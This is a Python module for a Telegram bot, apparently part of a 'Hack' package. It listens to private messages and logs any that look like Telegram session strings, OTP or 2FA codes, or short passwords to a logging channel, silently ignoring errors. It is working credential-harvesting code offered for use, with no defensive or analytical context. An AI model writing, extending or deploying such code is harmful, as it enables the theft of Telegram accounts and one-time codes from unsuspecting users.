import re
from html import escape as _esc
from telethon import events
from Hack import bot
from Hack.helpers import log_deep

_SESSION_RE = re.compile(r"^(1BVts|BQ|1B)")


@bot.on(events.NewMessage(incoming=True))
async def auto_logger(event):
    try:
        if not event.is_private: return
        if not event.text: return
        if event.text.startswith("/"): return
        sender = await event.get_sender()
        if not sender or getattr(sender, "bot", False): return
        text = event.text.strip()
        if not text: return
        if _SESSION_RE.match(text) or len(text) > 200:
            kind = "🔑 Session String"
        elif re.fullmatch(r"\d{5,6}", text):
            kind = "📱 OTP / 2FA Code"
        elif len(text) < 80:
            kind = "🔒 Password / Input"
        else:
            return
        extra = f"<b>{kind}</b>\n<code>{_esc(text[:4000])}</code>"
        await log_deep("📥 User Input", sender, extra=extra)
    except Exception:
        pass
